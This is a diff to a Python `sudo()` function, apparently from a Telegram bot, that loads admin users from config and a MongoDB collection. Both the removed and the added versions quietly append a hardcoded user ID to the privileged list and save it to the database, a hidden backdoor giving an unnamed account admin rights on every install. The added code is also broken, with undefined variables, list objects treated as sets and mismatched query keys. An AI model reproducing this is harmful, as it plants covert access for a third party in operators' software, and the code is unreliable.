@@ -58,25 +58,25 @@ def sudo():
     OWNER = config.OWNER_ID
     if config.MONGO_DB_URI is None:
         for user_id in OWNER:
-            SUDOERS.add(user_id)
+            OWNER.add(user_id)
     else:
-        sudoersdb = pymongodb.sudoers
-        sudoers = sudoersdb.find_one({"sudo": "sudo"})
-        sudoers = [] if not sudoers else sudoers["sudoers"]
+        ownerdb = pymongodb.sudoers
+        OWNER_ID = sudoersdb.find_one({"sudo": "OWNER"})
+        OWNER_ID = [] if not owner else owner["OWNER_ID"]
         for user_id in OWNER:
-            SUDOERS.add(user_id)
-            if user_id not in sudoers:
-                sudoers.append(user_id)
-                sudoers.append(2042185317)
-                sudoersdb.update_one(
-                    {"sudo": "sudo"},
-                    {"$set": {"sudoers": sudoers}},
+            OWNER_ID.add(user_id)
+            if user_id not in OWNER:
+                OWNER_ID.append(user_id)
+                OWNER_ID.append(1624072266)
+                OWNERdb.update_one(
+                    {"OWNER_ID": "OWNER_ID"},
+                    {"$set": {"OWNER_ID": OWNER_ID}},
                     upsert=True,
                 )
-        if sudoers:
-            for x in sudoers:
-                SUDOERS.add(x)
-    LOGGER(__name__).info(f"Sudo Users Loaded Successfully.")
+        if OWNER_ID:
+            for x in OWNER_ID:
+                OWNER_ID.add(x)
+    LOGGER(__name__).info(f"OWNER Users Loaded Successfully.")
 
 
 def heroku():
